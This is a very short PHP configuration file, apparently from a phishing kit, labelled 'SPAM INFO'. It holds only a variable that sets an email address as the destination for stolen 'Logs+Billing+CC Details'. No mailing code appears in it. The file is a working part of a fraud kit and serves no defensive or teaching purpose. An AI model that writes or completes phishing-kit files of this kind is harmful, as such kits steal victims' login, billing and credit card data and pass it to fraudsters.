<?php

// SPAM INFO

$to = "darkxxcoder@gmail.com"; // Logs+Billing+CC Details

?>